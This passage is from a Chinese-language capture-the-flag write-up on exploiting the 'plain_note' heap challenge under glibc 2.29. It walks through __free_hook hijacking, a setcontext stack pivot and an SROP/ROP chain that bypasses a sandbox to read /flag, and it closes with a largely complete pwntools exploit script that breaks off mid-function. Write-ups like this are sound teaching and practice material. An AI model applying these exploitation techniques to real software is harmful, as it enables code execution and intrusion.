    creat(sh, 0x38 , 'n')
    delete(sh, 18)
    delete(sh, 81)
    show(sh,79)
    heap_address = get__address(sh=sh,info='HEAP_ADDRESS --> ',start_string='',end_string='n',offset=-0x1270)
#### 劫持`__free_hook`，控制执行流(RIP)
首先申请一个`0x18`大小的`Chunk`，那个`Chunk`将位于`Chunk 1 + 0x10`，然后将其释放，再将之前申请的`Chunk
1`释放再取回，现在，我们可以操纵位于`Chunk 1 +
0x10`的所有域，于是我们达成任意地址读写，借助`__free_hook`可以直接升级为任意代码跳转。
    creat(sh, 0x18 , 'n')
    delete(sh, 18)
    delete(sh, 76)
    creat(sh, 0x28, p64(0) + p64(0x31)  + p64(libc.symbols['__free_hook']))
    creat(sh, 0x18 , 'n')
    creat(sh, 0x18 , p64(0xDEADBEEF))
####  沙箱绕过
首先我们有一个较为直接的思路是利用某种方式进行栈迁移，将`rsp`迁移到`heap`上，然后在`heap`上构造`ROP`链，进而完成利用。
这里我们需要先介绍`setcontext`函数。
函数原型：`int setcontext(const ucontext_t *ucp);`
这个函数的作用主要是用户上下文的获取和设置,可以利用这个函数直接控制大部分寄存器和执行流
以下代码是其在`Glibc 2.29`的实现
    .text:0000000000055E00                 public setcontext ; weak
    .text:0000000000055E00 setcontext      proc near ; CODE XREF: .text:000000000005C16C↓p
    .text:0000000000055E00                           ; DATA XREF: LOAD:000000000000C6D8↑o
    .text:0000000000055E00                 push    rdi
    .text:0000000000055E01                 lea     rsi, [rdi+128h]
    .text:0000000000055E08                 xor     edx, edx
    .text:0000000000055E0A                 mov     edi, 2
    .text:0000000000055E0F                 mov     r10d, 8
    .text:0000000000055E15                 mov     eax, 0Eh
    .text:0000000000055E1A                 syscall                 ; $!
    .text:0000000000055E1C                 pop     rdx
    .text:0000000000055E1D                 cmp     rax, 0FFFFFFFFFFFFF001h
    .text:0000000000055E23                 jnb     short loc_55E80
    .text:0000000000055E25                 mov     rcx, [rdx+0E0h]
    .text:0000000000055E2C                 fldenv  byte ptr [rcx]
    .text:0000000000055E2E                 ldmxcsr dword ptr [rdx+1C0h]
    .text:0000000000055E35                 mov     rsp, [rdx+0A0h]
    .text:0000000000055E3C                 mov     rbx, [rdx+80h]
    .text:0000000000055E43                 mov     rbp, [rdx+78h]
    .text:0000000000055E47                 mov     r12, [rdx+48h]
    .text:0000000000055E4B                 mov     r13, [rdx+50h]
    .text:0000000000055E4F                 mov     r14, [rdx+58h]
    .text:0000000000055E53                 mov     r15, [rdx+60h]
    .text:0000000000055E57                 mov     rcx, [rdx+0A8h]
    .text:0000000000055E5E                 push    rcx
    .text:0000000000055E5F                 mov     rsi, [rdx+70h]
    .text:0000000000055E63                 mov     rdi, [rdx+68h]
    .text:0000000000055E67                 mov     rcx, [rdx+98h]
    .text:0000000000055E6E                 mov     r8, [rdx+28h]
    .text:0000000000055E72                 mov     r9, [rdx+30h]
    .text:0000000000055E76                 mov     rdx, [rdx+88h]
    .text:0000000000055E7D                 xor     eax, eax
    .text:0000000000055E7F                 retn
根据此处的汇编可以看出，我们如果可以劫持`RDX`，我们就可以间接控制`RSP`，但我们通过劫持`__free_hook`来实现任意代码执行时，我们事实上只能劫持第一个参数也就是`RDI`。
而我们在`libc`中恰好可以找到一个好用的`gadget`:
⚠️：此`gadget`无法通过`ROPgadget`找到，请使用`ropper`来代替查找。
那么我们接下来布置`ROP`链即可:
    # SROP chain
    frame = SigreturnFrame()
    frame.rdi = heap_address + 0x30A0 + 0x100 + 0x100
    frame.rsi = 0
    frame.rdx = 0x100
    frame.rsp = heap_address + 0x30a0 + 0x100
    frame.rip = libc.address + 0x000000000002535f # : ret
    frame.set_regvalue('&fpstate', heap_address)
    str_frame = str(frame)
    payload = p64(libc.symbols['setcontext'] + 0x1d) + p64(heap_address + 0x30A0) + str_frame[0x10:]
    # ROP chain
    layout = [
        # sys_open("./flag", 0)
        libc.address + 0x0000000000047cf8, #: pop rax; ret; 
        2,
        libc.address + 0x00000000000cf6c5, #: syscall; ret; 
        # sys_read(flag_fd, heap, 0x100)
        libc.address + 0x0000000000026542, #: pop rdi; ret; 
        3, # maybe it is 2
        libc.address + 0x0000000000026f9e, #: pop rsi; ret; 
        heap_address + 0x10000,
        libc.address + 0x000000000012bda6, #: pop rdx; ret; 
        0x100,
        libc.address + 0x0000000000047cf8, #: pop rax; ret; 
        0,
        libc.address + 0x00000000000cf6c5, #: syscall; ret; 
        # sys_write(1, heap, 0x100)
        libc.address + 0x0000000000026542, #: pop rdi; ret; 
        1,
        libc.address + 0x0000000000026f9e, #: pop rsi; ret; 
        heap_address + 0x10000,
        libc.address + 0x000000000012bda6, #: pop rdx; ret; 
        0x100,
        libc.address + 0x0000000000047cf8, #: pop rax; ret; 
        1,
        libc.address + 0x00000000000cf6c5, #: syscall; ret; 
        # exit(0)
        libc.address + 0x0000000000026542, #: pop rdi; ret; 
        0,
        libc.address + 0x0000000000047cf8, #: pop rax; ret; 
        231,
        libc.address + 0x00000000000cf6c5, #: syscall; ret; 
    ]
    payload = payload.ljust(0x100, '') + flat(layout)
    payload = payload.ljust(0x200, '') + '/flag'
最后我们直接触发即可
    add(0x300, payload)
    delete(56)
我们来简单分析一下我们的利用链：
  1. 首先我们调用`free`后，流程会自动跳转至: 
        mov rdx, qword ptr [rdi + 8]
    mov rax, qword ptr [rdi]
    mov rdi, rdx
    jmp rax
我们传入的`[rdi]`是`p64(libc.symbols['setcontext'] + 0x1d) + p64(heap_address +
0x30A0)`
  2. 那么我们执行到`jmp rax`时，寄存器状况为`rax = libc.symbols['setcontext'] + 0x1d , rdx = heap_address + 0x30A0`，程序跳转执行`libc.symbols['setcontext'] + 0x1d`。
  3. 接下来将我们实现布置好的信息转移到对应寄存器内，栈迁移完成。
  4. 最后程序将执行我们的ROP链，利用结束。
###  Final Exploit
    from pwn import *
    import traceback
    import sys
    context.log_level='debug'
    context.arch='amd64'
    # context.arch='i386'
    plain_note=ELF('./plain_note', checksec = False)
    if context.arch == 'amd64':
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
    elif context.arch == 'i386':
        try:
            libc=ELF("/lib/i386-linux-gnu/libc.so.6", checksec = False)
        except:
            libc=ELF("/lib32/libc.so.6", checksec = False)
    def get_sh(Use_other_libc = False , Use_ssh = False):
        global libc
        if args['REMOTE'] :
            if Use_other_libc :
                libc = ELF("./", checksec = False)
            if Use_ssh :
                s = ssh(sys.argv[3],sys.argv[1], sys.argv[2],sys.argv[4])
                return s.process("./plain_note")
            else:
                return remote(sys.argv[1], sys.argv[2])
        else:
            return process("./plain_note")
    def get_address(sh,info=None,start_string=None,address_len=None,end_string=None,offset=None,int_mode=False):
        if start_string != None:
            sh.recvuntil(start_string)
        if int_mode :
            return_address = int(sh.recvuntil(end_string,drop=True),16)
        elif address_len != None:
            return_address = u64(sh.recv()[:address_len].ljust(8,'x00'))
        elif context.arch == 'amd64':
            return_address=u64(sh.recvuntil(end_string,drop=True).ljust(8,'x00'))
        else:
            return_address=u32(sh.recvuntil(end_string,drop=True).ljust(4,'x00'))
        if offset != None:
            return_address = return_address + offset
        if info != None:
            log.success(info + str(hex(return_address)))
        return return_address
    def get_gdb(sh,gdbscript=None,stop=False):
        gdb.attach(sh,gdbscript=gdbscript)
        if stop :
            raw_input()
    def creat(sh,chunk_size,value):
        sh.recvuntil('Choice: ')
        sh.sendline('1')
        sh.recvuntil('Size: ')
        sh.sendline(str(chunk_size))
        sh.recvuntil('Content: ')
        sh.send(value)
    def delete(sh,index):
        sh.recvuntil('Choice: ')
        sh.sendline('2')
        sh.recvuntil('Idx: ')
        sh.sendline(str(index))
    def show(sh,index):
        sh.recvuntil('Choice: ')
        sh.sendline('3')
        sh.recvuntil('Idx: ')
        sh.sendline(str(index))
    def Attack():
        # Your Code here
        while True:
            sh = get_sh()
            # Clean Bins
            for i in range(7 + 11):
                creat(sh, 0x18 , 'Clean' + 'n')
            for i in range(7 + 3):
                creat(sh, 0x38 , 'Clean' + 'n')
            for i in range(7 + 9):
                creat(sh, 0x68 , 'Clean' + 'n')
            for i in range(7 + 2):
                creat(sh, 0x78 , 'Clean' + 'n')
            for i in range(5):
                creat(sh, 0xC8 , 'Clean' + 'n')
            for i in range(6):
                creat(sh, 0xE8 , 'Clean' + 'n')
            # Make unlink
            for i in range(7):
                creat(sh, 0x28 , 'chunk_' + str(64 + i) + 'n')
            creat(sh, 0xBF8 , 'pad' + 'n')
            # creat(sh, 0x18  , 'Test' + 'n')
            creat(sh, 0x5E0 , 'chunk_72' + 'n') 
            creat(sh, 0x18  , 'chunk_73' + 'n')
            delete(sh,72)
            creat(sh, 0x618 , 'chunk_72' + 'n')
            creat(sh, 0x28  , 'a' * 8 + p64(0xe1) + p8(0x90))
            creat(sh, 0x28  , 'chunk_75' + 'n')
            creat(sh, 0x28  , 'chunk_76' + 'n')
            creat(sh, 0x28  , 'chunk_77' + 'n')
            creat(sh, 0x28  , 'chunk_78' + 'n')
            for i in range(7):
                delete(sh, i + 64)
            delete(sh, 75)
            delete(sh, 77)
            for i in range(7):
                creat(sh, 0x28 , 'chunk_' + str(64 + i) + 'n')
            creat(sh, 0x618 , 'chunk_75' + 'n')
            creat(sh, 0x28  , 'b' * 8 + p8(0x10))
            creat(sh, 0x28  , 'chunk_1')
            for i in range(7):
                delete(sh, i + 64)
            delete(sh, 78)
            delete(sh, 74)
            for i in range(7):
                creat(sh, 0x28 , 'chunk_' + str(64+i) + 'n')
            creat(sh, 0x28  , p8(0x10))
            creat(sh, 0x28  , 'c' * 0x20 + p64(0xe0))
            creat(sh, 0x4F8  , 'n')
            delete(sh, 80)
            try:
                #Leak info
                creat(sh, 0x18 , 'n')
                show(sh,79)
                libc.address = get_address(sh=sh,info='LIBC_ADDRESS --> ',start_string='',end_string='n',offset=0x7f30e85f4000-0x7f30e87d8ca0)